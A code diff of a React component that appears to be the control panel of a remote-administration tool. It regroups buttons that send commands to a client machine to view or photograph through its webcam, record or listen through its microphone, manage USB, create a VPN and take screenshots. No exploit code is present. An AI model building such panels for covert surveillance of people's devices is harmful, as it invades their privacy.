@@ -190,6 +190,30 @@ export const ClientDetails: React.FC = () => {
         }
     ];
 
+    const cameraItems: MenuProps['items'] = [
+        {
+            key: 'start_camera',
+            label: 'View the webcam',
+            onClick: () => handleOpenWebcamModal()
+        },
+        {
+            key: 'take_of_picture',
+            label: 'Take a picture with a webcam'
+        }
+    ];
+
+    const audioItems: MenuProps['items'] = [
+        {
+            key: 'record_audio',
+            label: 'Record Audio',
+            onClick: () => handleRecordAudio()
+        },
+        {
+            key: 'listen_microphone',
+            label: 'Listen to the microphone'
+        }
+    ];
+
     // Вебкамера
     const handleOpenWebcamModal = async () => {
         await sendCommand('start_camera');
@@ -254,14 +278,19 @@ export const ClientDetails: React.FC = () => {
                 </Col>
                 <Col>
                     <Space>
-                        <Button onClick={handleOpenWebcamModal}>View the webcam</Button>
-                        <Button onClick={() => sendCommand('create_vpn')}>
-                            Create VPN connection
-                        </Button>
-                        <Button onClick={handleRecordAudio}>Record Audio</Button>
+                        {/* <Button onClick={handleOpenWebcamModal}>Webcam</Button> */}
+                        <Dropdown menu={{ items: cameraItems }} placement="bottomLeft">
+                            <Button>Webcam</Button>
+                        </Dropdown>
+                        <Dropdown menu={{ items: audioItems }} placement="bottomLeft">
+                            <Button>Audio</Button>
+                        </Dropdown>
                         <Dropdown menu={{ items: usbItems }} placement="bottomLeft">
                             <Button>USB</Button>
                         </Dropdown>
+                        <Button onClick={() => sendCommand('create_vpn')}>
+                            Create VPN connection
+                        </Button>
                         <Button onClick={handleScreenshot}>Take Screenshot</Button>
                     </Space>
                 </Col>
